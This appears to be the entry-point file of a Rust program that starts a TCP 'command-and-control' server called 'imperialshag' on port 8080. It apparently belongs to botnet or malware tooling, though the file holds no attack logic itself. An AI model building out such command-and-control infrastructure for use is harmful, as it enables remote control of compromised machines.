mod server;

const IP: &'static str = "0.0.0.0";
const PORT: u16 = 8080;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("Welcome to imperialshag :)");
    println!("Starting TCP server.");

    server::start_cnc_server(IP, PORT).await?;

    Ok(())
}
